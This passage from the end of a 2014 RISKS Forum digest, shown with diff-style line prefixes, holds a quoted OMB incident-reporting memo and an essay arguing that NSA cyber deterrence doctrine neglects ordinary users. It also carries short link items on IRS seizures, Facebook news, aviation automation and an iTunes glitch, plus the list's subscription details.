+"Specifically, this memorandum ... requires Federal agencies to notify DHS
+US-CERT of all cyber related (electronic) incidents ... ***within one
+hour***"
+
+"All existing Federal requirements for data protection and remote access are
+applicable to mobile devices" [...]
+
+See also
+http://www.whitehouse.gov/sites/default/files/omb/memoranda/2015/m-15-01.pdf
+
+------------------------------
+
+Date: Fri, 10 Oct 2014 09:15:18 -0700
+From: Henry Baker <hbaker1@pipeline.com>
+Subject: The NSA has no interest in protecting you & me
+
+The following paragraphs are an attempt to explain why the NSA hasn't any
+interest in protecting you and me from cyber criminals.  It isn't
+nonfeasance, but a result of the misapplication of Cold War thinking to the
+Internet, and the NSA's preoccupation with China instead of with criminal
+gangs on the Internet.
+
+You and I are merely the "human shields" in this new Cold Cyberwar which the
+US DoD has deluded itself exists with China.
+
+The US Defense Department in 2014 is still caught up in obsolete concepts
+from the Cold War when it inappropriately attempts to achieve "deterrence"
+through "mutual vulnerability" in *cyber warfare*.
+
+The concept of "Mutually Assured Destruction" (MAD) attempts to convince
+both sides in a conflict that no matter who starts a war, both sides will be
+utterly destroyed.  MAD was the primary doctrine of the US throughout most
+of the Cold War, and although the Soviets never did attack, they also never
+completely bought into the MAD notion.
+
+A major component of MAD is "Mutual Vulnerability": since both sides are
+equally vulnerable, each feels that it has more to lose from a war than the
+other.  However, one curious consequence of Mutual Vulnerability is that
+*Civil Defense is actually destabilizing*.  If one side invests
+significantly in civil defense, it becomes less vulnerable, and may believe
+that a war is survivable.  Such a civil defense strategy will break the
+"Mutual" in MAD.
+
+During the Cold War, therefore, the US invested almost nothing in civil
+defense; the Soviets -- not so enamored with mutual vulnerability --
+invested huge amounts.
+
+As the links & quotes below demonstrate, the US DoD today has already
+conceded that its cyber defenses are next-to-non-existent, and therefore has
+ramped up its *offenses* -- e.g., the NSA's "TAO" group -- because it
+believes that a MAD-style offensive deterrence is far cheaper than improving
+defenses (i.e., echoes of the US Cold War strategy).
+
+In the upside-down-world of MAD, mutual deterrence depends upon *mutual
+vulnerability*, and hence *more vulnerable is better* !?!
+
+The major problem with this MAD strategy is that while the deterrence may
+eventually work against the Chinese *state*, this deterrence has absolutely
+no effect against criminal enterprises terrorizing the Internet.  None of
+these criminals feel the "Mutual" in MAD, much less the "Assured" or the
+"Destruction".
+
+So "MAD" is the reason why you and I remain vulnerable to ID crooks &
+thieves; the more vulnerable, the better the deterrence works -- at least
+against the Chinese.
+
+If all of this sounds insane/MAD, you're right!  It is insane, which is why
+RISKS readers have to blow the whistle on these bankrupt Cold War relic
+doctrines.
+
+[See also the following items, truncated for RISKS.  PGN]
+
+"A World Gone MAD No Longer"
+http://missiledefensereview.org/2014/07/30/a-world-gone-mad-no-longer/
+
+Sino-American Strategic Restraint in an Age of Vulnerability
+by David C. Gompert and Phillip C. Saunders
+http://www.dtic.mil/get-tr-doc/pdf?AD=ADA577518
+
+------------------------------
+
+Date: Sun, 26 Oct 2014 09:05:59 -0400
+From: Monty Solomon <monty@roscom.com>
+Subject: Law Lets I.R.S. Seize Accounts on Suspicion, No Crime Required
+
+Using a law designed to help catch drug traffickers, racketeers and
+terrorists by tracking their cash, the government has gone after
+run-of-the-mill business owners and wage earners.
+
+http://www.nytimes.com/2014/10/26/us/law-lets-irs-seize-accounts-on-suspicion-no-crime-required.html
+
+------------------------------
+
+Date: Sun, 26 Oct 2014 23:37:56 -0400
+From: Monty Solomon <monty@roscom.com>
+Subject: How Facebook Is Changing the Way Its Users Consume Journalism
+
+Facebook uses mathematical formulas to predict what its users might want to
+read on the site, from which, a study says, about 30 percent of adults in
+America get their news.
+
+http://www.nytimes.com/2014/10/27/business/media/how-facebook-is-changing-th=
+e-way-its-users-consume-journalism.html
+
+------------------------------
+
+Date: Fri, 24 Oct 2014 17:24:35 -0500
+From: Dimitri Maziuk <dmaziuk@bmrb.wisc.edu>
+Subject: Re: where last passenger went (Epstein, RISKS-28.31)
+
+I'd be more worried about taxi drivers perusing the google's location
+history URL, finding areas where most destinations are, and staying
+there. The risk is then you can't get a cab anywhere else.
+
+BioMagResBank, UW-Madison -- http://www.bmrb.wisc.edu
+
+------------------------------
+
+Date: 24 Oct 2014 23:16:37 -0000
+From: "John Levine" <johnl@iecc.com>
+Subject: Re: Should Airplanes Be Flying Themselves? (William Langewiesche)
+
+It's an excellent article, well worth the 10 minutes to read it.
+
+The Gimli Glider was in many ways the direct opposite of the Air France
+crash.  In the Gimli case, there was a real and very severe problem, the
+plane was in the middle of nowhere and ran out of fuel.  If the pilots
+hadn't taken skillful action, the plane would have fallen out of the sky and
+crashed.
+
+With the Air France flight, there was no physical problem other than that
+some sensors were iced over.  As Langewiesche makes clear, if the pilots had
+done nothing at all, the plane would have been fine.  The sensor loss made
+the plane drop back from the most automatic mode to a less automatic one,
+but even so, the plane was flying without difficulty.
+
+------------------------------
+
+Date: Fri, 24 Oct 2014 18:17:40 -0700
+From: Henry Baker <hbaker1@pipeline.com>
+Subject: Taylor Swift Tops Canadian iTunes Chart With 8 Seconds of White
+  Noise (Lorena O'Neil)
+
+FYI -- I wonder if the music isn't "white noise" after all, but the sole
+sound of DRM.  I can't wait for this clip to be posted to YouTube, so that a
+DMCA takedown notice can be issued by one of those DMCA bots!
+
+Lorena O'Neil, The Hollywood Reporter
+http://www.msn.com/en-us/music/news/taylor-swift-tops-canadian-itunes-chart-with-eight-seconds-of-white-noise/ar-BBaCB7A
+
+A glitch in the Canadian version of iTunes released a track called "Track
+3," that looked like it could be a new track from her upcoming album 1989
+but was actually just white noise.  Nevertheless, the song soared to the
+top, beating out her new songs that actually are real music, including
+"Shake It Off," "Welcome to New York" and "Out of the Woods."
+
+Haters might hate but once a singer scores a chart-topping hit comprised
+solely of white noise, it's hard to deny she's an unstoppable musical force.
+
+------------------------------
+
+Date: Sun, 7 Oct 2012 20:20:16 -0900
+From: RISKS-request@csl.sri.com
+Subject: Abridged info on RISKS (comp.risks)
+
+ The ACM RISKS Forum is a MODERATED digest. Its Usenet manifestation is
+ comp.risks, the feed for which is donated by panix.com as of June 2011.
+=> SUBSCRIPTIONS: PLEASE read RISKS as a newsgroup (comp.risks or equivalent)
+ if possible and convenient for you.  The mailman Web interface can
+ be used directly to subscribe and unsubscribe:
+   http://lists.csl.sri.com/mailman/listinfo/risks
+ Alternatively, to subscribe or unsubscribe via e-mail to mailman
+ your FROM: address, send a message to
+   risks-request@csl.sri.com
+ containing only the one-word text subscribe or unsubscribe.  You may
+ also specify a different receiving address: subscribe address= ... .
+ You may short-circuit that process by sending directly to either
+   risks-subscribe@csl.sri.com or risks-unsubscribe@csl.sri.com
+ depending on which action is to be taken.
+
+ Subscription and unsubscription requests require that you reply to a
+ confirmation message sent to the subscribing mail address.  Instructions
+ are included in the confirmation message.  Each issue of RISKS that you
+ receive contains information on how to post, unsubscribe, etc.
+
+=> The complete INFO file (submissions, default disclaimers, archive sites,
+ copyright policy, etc.) is online.
+   <http://www.CSL.sri.com/risksinfo.html>
+ *** Contributors are assumed to have read the full info file for guidelines.
+
+=> .UK users may contact <Lindsay.Marshall@newcastle.ac.uk>.
+=> SPAM challenge-responses will not be honored.  Instead, use an alternative
+ address from which you NEVER send mail!
+=> SUBMISSIONS: to risks@CSL.sri.com with meaningful SUBJECT: line.
+ *** NOTE: Including the string `notsp' at the beginning or end of the subject
+ *** line will be very helpful in separating real contributions from spam.
+ *** This attention-string may change, so watch this space now and then.
+=> ARCHIVES: ftp://ftp.sri.com/risks for current volume
+     or ftp://ftp.sri.com/VL/risks for previous VoLume
+ http://www.risks.org takes you to Lindsay Marshall's searchable archive at
+ newcastle: http://catless.ncl.ac.uk/Risks/VL.IS.html gets you VoLume, ISsue.
+   Lindsay has also added to the Newcastle catless site a palmtop version
+   of the most recent RISKS issue and a WAP version that works for many but
+   not all telephones: http://catless.ncl.ac.uk/w/r
+ <http://the.wiretapped.net/security/info/textfiles/risks-digest/> .
+==> PGN's comprehensive historical Illustrative Risks summary of one liners:
+    <http://www.csl.sri.com/illustrative.html> for browsing,
+    <http://www.csl.sri.com/illustrative.pdf> or .ps for printing
+  is no longer maintained up-to-date except for recent election problems.
+ *** NOTE: If a cited URL fails, we do not try to update them.  Try
+  browsing on the keywords in the subject line or cited article leads.
+==> Special Offer to Join ACM for readers of the ACM RISKS Forum:
+    <http://www.acm.org/joinacm1>
+
+------------------------------
+
+End of RISKS-FORUM Digest 28.32
+************************
